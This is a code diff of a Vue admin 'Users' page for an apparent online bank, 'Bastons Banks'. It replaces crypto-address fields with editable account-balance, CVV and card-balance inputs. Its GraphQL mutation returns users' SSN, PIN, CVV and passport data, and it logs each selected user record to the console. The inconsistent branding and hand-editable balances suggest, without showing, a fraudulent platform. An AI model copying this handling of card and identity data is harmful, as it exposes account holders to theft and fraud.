@@ -4,7 +4,7 @@
       <div class="sm:flex sm:items-center">
         <div class="sm:flex-auto">
           <h1 class="text-base font-semibold leading-6 text-gray-900">Users</h1>
-          <p class="mt-2 text-sm text-gray-700">A list of all the users in your account including their name, title,
+          <p class="mt-2 text-sm text-gray-700">A list of all the users available,
             email
             and role.</p>
         </div>
@@ -20,7 +20,8 @@
             <table class="min-w-full divide-y divide-gray-300">
               <thead>
                 <tr>
-                  <th scope="col" class="py-3.5 pl-4 pr-3 text-left text-sm font-semibold text-gray-900 sm:pl-0">Name
+                  <th scope="col" class="py-3.5 pl-4 pr-3 text-left text-sm font-semibold text-gray-900 sm:pl-0">Full
+                    Name
                   </th>
                   <th scope="col" class="px-3 py-3.5 text-left text-sm font-semibold text-gray-900">Account Balance</th>
                   <th scope="col" class="px-3 py-3.5 text-left text-sm font-semibold text-gray-900">Status</th>
@@ -46,7 +47,10 @@
                     </div>
                   </td>
                   <td class="whitespace-nowrap px-3 py-5 text-sm text-gray-500">
-                    <div class="text-gray-900">{{ formatNumberAsDollar(user.accountBalance) ?? 'Nil' }}</div>
+                    <div class="text-gray-900">
+                      {{ user.accountCurrency ?? 'Nil' }}
+                      {{ formatNumberAsDollar(user.accountBalance) ?? 'Nil' }}
+                    </div>
                     <!-- <div class="mt-1 text-gray-500">Optimization</div> -->
                   </td>
                   <td class="whitespace-nowrap px-3 py-5 text-sm text-gray-500">
@@ -58,8 +62,8 @@
                   <td class="whitespace-nowrap px-3 py-5 text-sm text-gray-500">{{ formatDateTime(user.timeAdded) ??
             'Nil' }}</td>
                   <td class="relative whitespace-nowrap py-5 pl-3 pr-4 text-right text-sm font-medium sm:pr-0">
-                    <button @click="previewUser(user)" type="button" class="bg-black text-white">
-                      <img src="@/assets/icons/more.svg" alt="more" class="h-4" />
+                    <button @click="previewUser(user)" type="button">
+                      <img src="@/assets/icons/more.svg" alt="more" class="h-4 w-4" />
                     </button>
                   </td>
                 </tr>
@@ -82,35 +86,27 @@
         </div>
         <form @submit.prevent="updateUserInfo" class="p-4  space-y-6 max-w-xl">
           <div class="space-y-1">
-            <label class="text-xs text-gray-700 font-medium">Eth Address</label>
-            <input v-model="selectedUser.eth" type="tel"
-              class="py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base">
-            <span class="text-xs text-gray-500">We'll never share your details with anyone else</span>
-          </div>
-
-
-          <div class="space-y-1">
-            <label class="text-xs text-gray-700 font-medium">Btc Address</label>
-            <input v-model="selectedUser.btc" type="tel"
-              class="py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base">
-            <span class="text-xs text-gray-500">We'll never share your details with anyone else</span>
-          </div>
-
-          <div class="space-y-1">
             <label class="text-xs text-gray-700 font-medium">Account Balance</label>
-            <input v-model="selectedUser.accountBalance" type="tel"
+            <input v-model="selectedUserData.accountBalance" type="tel"
               class="py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base">
             <span class="text-xs text-gray-500">We'll never share your details with anyone else</span>
           </div>
 
           <div class="space-y-1">
-            <label class="text-xs text-gray-700 font-medium">Trading Balance</label>
-            <input v-model="selectedUser.tradingBalance" type="tel"
+            <label class="text-xs text-gray-700 font-medium">CVV</label>
+            <input v-model="selectedUserData.cvv" type="tel"
+              class="py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base">
+            <span class="text-xs text-gray-500">We'll never share your details with anyone else</span>
+          </div>
+
+          <div class="space-y-1">
+            <label class="text-xs text-gray-700 font-medium">Card Balance</label>
+            <input v-model="selectedUserData.cardBalance" type="tel"
               class="py-3 md:py-2 border rounded-md w-full outline-none pl-6 text-sm md:text-base">
             <span class="text-xs text-gray-500">We'll never share your details with anyone else</span>
           </div>
           <div class="w-full flex justify-between items-center gap-x-6">
-            <button type="submit"
+            <button type="submit" :disabled="processing"
               class="bg-green-500 disabled:cursor-not-allowed disabled:opacity-25 w-full text-white rounded-lg px-6 py-3 text-sm">
               {{ processing ? 'processing...' : 'Update' }}
             </button>
@@ -128,6 +124,36 @@ import EmptyState from '@/components/core/EmptyState.vue'
 import Modal from '@/components/core/Modal.vue'
 export default {
   layout: 'admin-dashboard',
+  head() {
+    return {
+      title: 'Bastons Banks | Admin Users List',
+      meta: [
+        // Standard meta tags
+        { charset: 'utf-8' },
+        { name: 'viewport', content: 'width=device-width, initial-scale=1' },
+
+        // SEO meta tags
+        { hid: 'description', name: 'description', content: 'Mobile Banking, Credit Cards, Mortgages, Auto Loan' },
+        { hid: 'keywords', name: 'keywords', content: 'Mobile Banking, Credit Cards, Mortgages, Auto Loan' },
+
+        // Open Graph / Facebook meta tags for rich sharing
+        { hid: 'og:title', property: 'og:title', content: 'Bastons Banks | Admin Users List' },
+        { hid: 'og:description', property: 'og:description', content: 'Mobile Banking, Credit Cards, Mortgages, Auto Loan' },
+        { hid: 'og:type', property: 'og:type', content: 'website' },
+        { hid: 'og:url', property: 'og:url', content: 'https://www.bastonsbanks.com/admin/dashboard/users' },
+        { hid: 'og:image', property: 'og:image', content: 'https://bastionbanks.com/uploads/1682584899_6502d067c95383061f4a.png' },
+
+        // Twitter Card meta tags
+        { hid: 'twitter:card', name: 'twitter:card', content: '' },
+        { hid: 'twitter:title', name: 'twitter:title', content: 'Bastons Banks | Admin Users List' },
+        { hid: 'twitter:description', name: 'twitter:description', content: 'Mobile Banking, Credit Cards, Mortgages, Auto Loan' },
+        { hid: 'twitter:image', name: 'twitter:image', content: 'https://bastionbanks.com/uploads/1682584899_6502d067c95383061f4a.png' },
+      ],
+      link: [
+        { rel: 'icon', type: 'image/x-icon', href: '/favicon.ico' },
+      ]
+    }
+  },
   components: {
     Modal,
     EmptyState
@@ -137,7 +163,8 @@ export default {
       loading: false,
       processing: false,
       isModalVisible: false,
-      selectedUser: {},
+      loggedInAdmin: {},
+      selectedUserData: {},
       usersList: [],
     }
   },
@@ -152,7 +179,7 @@ export default {
     async fetchUsers() {
       this.loading = true
       if (process.client) {
-        const accessToken = JSON.parse(window.localStorage.getItem('auth'))
+        const accessToken = JSON.parse(sessionStorage.getItem('auth'))
         this.loading = true
         const query = `
         query {
@@ -215,25 +242,41 @@ export default {
       return `${firstInitial}`
     },
     formatNumberAsDollar(number) {
-      return number?.toLocaleString('en-US', { style: 'currency', currency: 'USD' })
+      return number?.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
     },
     async updateUserInfo() {
       this.processing = true
       if (process.client) {
-        const accessToken = JSON.parse(window.localStorage.getItem('auth'))
+        const accessToken = JSON.parse(sessionStorage.getItem('auth'))
         try {
           const updateUserMutation = `
           mutation updateUser($userId: String!, $input: UpdateUser!) {
             updateUser(userId: $userId, input: $input) {
-             btc
-             eth
-             accountBalance
-             tradingBalance
+              name
+              email
+              phoneNumber
+              dob
+              gender
+              ssn
+              occupation
+              country
+              city
+              zip
+              address
+              accountCurrency
+              cardBalance
+              cvv
+              pin
+              passport
+              identification
+              eth
+              btc
+              accountBalance
             }
           }
         `
           const response = await fetch(
-            'https://visionary-zpui.onrender.com/graphql/query',
+            'https://fidelityvalues.onrender.com/graphql/query',
             {
               method: 'POST',
               headers: {
@@ -243,12 +286,11 @@ export default {
               body: JSON.stringify({
                 query: updateUserMutation,
                 variables: {
-                  userId: this.selectedUser.id ?? '',
+                  userId: this.selectedUserData.id ?? '',
                   input: {
-                    btc: this.selectedUser.btc,
-                    eth: this.selectedUser.eth,
-                    accountBalance: this.selectedUser.accountBalance,
-                    tradingBalance: this.selectedUser.tradingBalance
+                    accountBalance: this.selectedUserData.accountBalance,
+                    cvv: this.selectedUserData.cvv,
+                    cardBalance: this.selectedUserData.cardBalance
                   }
                 }
               })
@@ -267,8 +309,9 @@ export default {
       }
     },
     previewUser(data) {
+      console.log(data, 'data here')
       this.isModalVisible = true
-      this.selectedTransaction = data
+      this.selectedUserData = data
     },
     formatDateTime(date) {
       if (typeof date === 'string') {
@@ -285,7 +328,7 @@ export default {
     async getUserInfo() {
       this.loading = true
       if (process.client) {
-        const accessToken = JSON.parse(window.localStorage.getItem('auth'))
+        const accessToken = JSON.parse(sessionStorage.getItem('auth'))
         this.loading = true
         const query = `
         query {
@@ -346,7 +389,7 @@ export default {
           if (data?.errors) {
             this.$toastr.e(data.errors[0].message)
           } else {
-            this.selectedUser = data.data.getUser
+            this.loggedInAdmin = data.data.getUser
           }
         } finally {
           this.loading = false
